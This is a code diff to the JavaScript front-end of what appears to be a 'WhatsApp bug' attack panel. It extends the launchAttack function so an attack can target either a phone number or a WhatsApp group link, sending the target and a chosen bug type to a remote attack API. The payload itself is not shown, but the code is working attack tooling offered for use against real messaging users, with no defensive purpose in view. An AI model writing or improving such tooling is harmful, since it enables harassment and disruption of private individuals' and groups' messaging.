@@ -357,29 +357,45 @@ async function resetPassword() {
 
 // Launch attack
 async function launchAttack() {
-  const targetNumber = document.getElementById('targetNumber').value;
+  const targetNumber = document.getElementById('targetNumber').value.trim();
+  const whatsappGroup = document.getElementById('whatsappGroup').value.trim();
   const bugType = document.getElementById('bugType').value;
   const attackBtn = document.getElementById('attackBtn');
   const attackResult = document.getElementById('attackResult');
 
-  if (!targetNumber) {
-    attackResult.innerHTML = 'Please enter target number';
-    attackResult.style.color = '#f44336';
+  // Clear previous messages
+  attackResult.innerHTML = '';
+  attackResult.style.color = '';
+
+  // Validate inputs
+  if (!targetNumber && !whatsappGroup) {
+    showError(attackResult, 'Please enter either target number or WhatsApp group link');
     return;
   }
 
-  attackBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Attacking...';
-  attackBtn.disabled = true;
+  if (targetNumber && whatsappGroup) {
+    showError(attackResult, 'Please use either target number OR WhatsApp group, not both');
+    return;
+  }
+
+  // Set loading state
+  setButtonLoading(attackBtn, true);
 
   try {
     const isConnected = await checkApiConnection();
     if (!isConnected) {
-      attackResult.innerHTML = 'API is currently unavailable';
-      attackResult.style.color = '#f44336';
+      showError(attackResult, 'API is currently unavailable');
       return;
     }
 
-    const response = await fetch(`${ATTACK_API_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${bugType}`);
+    let apiUrl = `${ATTACK_API_URL}?type=${bugType}`;
+    if (targetNumber) {
+      apiUrl += `&chatId=${encodeURIComponent(targetNumber)}`;
+    } else {
+      apiUrl += `&groupLink=${encodeURIComponent(whatsappGroup)}`;
+    }
+
+    const response = await fetch(apiUrl);
     
     if (!response.ok) {
       throw new Error("Failed to connect to server");
@@ -388,18 +404,15 @@ async function launchAttack() {
     const result = await response.json();
     
     if (result.success) {
-      attackResult.innerHTML = `Attack launched successfully against ${targetNumber}`;
-      attackResult.style.color = 'var(--main)';
+      const target = targetNumber || whatsappGroup;
+      showSuccess(attackResult, `Attack launched successfully against ${target}`);
     } else {
-      attackResult.innerHTML = result.message || 'Attack failed';
-      attackResult.style.color = '#f44336';
+      showError(attackResult, result.message || 'Attack failed');
     }
   } catch (error) {
-    attackResult.innerHTML = 'Attack failed: ' + error.message;
-    attackResult.style.color = '#f44336';
+    showError(attackResult, 'Attack failed: ' + error.message);
   } finally {
-    attackBtn.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
-    attackBtn.disabled = false;
+    setButtonLoading(attackBtn, false);
   }
 }
 
